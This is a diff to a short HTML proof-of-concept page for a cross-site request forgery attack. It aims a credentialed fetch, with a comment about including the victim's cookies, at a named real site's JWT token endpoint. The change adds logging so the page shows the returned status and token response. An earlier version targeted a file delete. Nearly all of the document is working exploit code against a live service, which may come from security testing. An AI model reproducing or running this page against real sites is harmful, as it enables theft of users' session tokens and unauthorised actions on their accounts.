@@ -2,24 +2,36 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC - AJAX GET Delete</title>
+  <title>CSRF PoC with Error Handling</title>
 </head>
 <body>
-  <h2>CSRF PoC - Trigger File Delete</h2>
-  <button onclick="exploit()">Trigger Delete</button>
+  <h2>CSRF PoC - With Error Logging</h2>
+  <button onclick="exploit()">Trigger Request</button>
+
+  <pre id="output"></pre>
 
   <script>
+    function log(msg) {
+      document.getElementById("output").textContent += msg + "\n";
+    }
+
     function exploit() {
       fetch("https://www.datacamp.com/api/jwt/token", {
         method: "GET",
-        credentials: "include", // send victim cookies
+        credentials: "include", // include victim cookies
         headers: {
           "X-Requested-With": "XMLHttpRequest",
           "Accept": "application/json, text/plain, */*"
         }
       })
-      .then(r => r.text())
-      .then(console.log);
+      .then(async response => {
+        log("Status: " + response.status);
+        const text = await response.text();
+        log("Response:\n" + text);
+      })
+      .catch(err => {
+        log("Error: " + err);
+      });
     }
   </script>
 </body>
